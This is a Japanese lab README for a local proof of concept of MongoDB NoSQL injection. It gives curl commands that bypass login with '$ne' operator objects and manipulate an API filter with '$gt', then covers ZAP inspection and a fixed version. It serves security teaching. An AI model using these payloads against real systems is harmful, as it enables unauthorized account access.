# PoC⑥: MongoDB NoSQL injection

SQLではなくMongoDBの検索条件に、JSONオブジェクトをそのまま渡してしまう例。
`' OR '1'='1'` の代わりに、`{"$ne": null}` のような条件オブジェクトで認証をすり抜ける。

```bash
cd ..
docker compose up --build
# 脆弱版: http://127.0.0.1:5006
# 修正版: http://127.0.0.1:5016
```

## 手動攻撃

### 1. 通常ログイン失敗

```bash
curl -s -X POST http://127.0.0.1:5006/login \
  -H 'Content-Type: application/json' \
  -d '{"username":"admin","password":"wrong"}'
```

### 2. NoSQL injectionでログイン突破

```bash
curl -s -X POST http://127.0.0.1:5006/login \
  -H 'Content-Type: application/json' \
  -d '{"username":{"$ne":null},"password":{"$ne":null}}'
```

→ `username` と `password` が文字列ではなくMongoDB条件として扱われ、最初に一致したユーザーでログイン成功する。

### 3. API検索条件を差し替える

```bash
curl -s 'http://127.0.0.1:5006/api/customers?filter={"total":{"$gt":0}}'
```

→ 本来は絞り込み条件のはずが、クエリ構造そのものを利用者に渡してしまっている。

## ZAPで見るポイント

- ZAPはSQLiのようにNoSQL injectionを必ず分かりやすく検出するとは限らない
- Request/Responseを見て、JSON本文がそのまま検索条件になっていないか確認する
- Replacer/Requester等でJSON値を条件オブジェクトに置き換えて挙動差を見る

## 対策確認

修正版 `http://127.0.0.1:5016` で同じJSONを送る。

- `username` / `password` が文字列でなければ400で拒否される
- 認証クエリは `{"username": username, "password": password}` の固定形になる
- API検索は利用者が自由なMongoDB演算子を渡せない形にする
